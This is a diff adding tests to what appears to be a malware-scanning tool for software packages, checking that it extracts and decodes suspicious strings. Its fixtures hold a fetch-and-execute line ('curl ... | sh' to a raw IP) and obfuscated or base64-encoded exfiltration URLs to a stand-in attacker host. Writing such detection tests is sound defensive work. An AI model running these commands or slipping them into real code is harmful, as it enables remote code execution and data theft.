@@ -98,3 +98,18 @@ def test_package_text_cannot_close_the_data_block(monkeypatch):
 def test_loop_stops_after_max_steps(monkeypatch):
     res, calls = run(monkeypatch, [step(path="setup.js")] * inv.MAX_STEPS + [verdict([], "benign")])
     assert len(res.steps) == inv.MAX_STEPS and len(calls) == inv.MAX_STEPS + 1
+
+
+def test_strings_reads_string_tables_and_binaries():
+    table = b"var _0x1 = ['fromCharCode', 'https://evil.example/c', 'child_process', 'hello there'];"
+    r = inv.Reader(pkg_of({"a.js": table, "b.node": b"\0\0\x7fELF\0curl -s http://1.2.3.4/x|sh\0\0short\0"}))
+    assert r.strings("a.js").lines[0] == "https://evil.example/c"
+    assert "hello there" not in r.strings("a.js").lines
+    assert "curl -s http://1.2.3.4/x|sh" in r.strings("b.node").lines
+    assert isinstance(r.strings("missing.js"), str)
+
+
+def test_strings_decode_what_they_find():
+    import base64
+    data = b"const c = '" + base64.b64encode(b"https://evil.example/collect") + b"'"
+    assert "https://evil.example/collect" in inv.telling_strings(data, True)
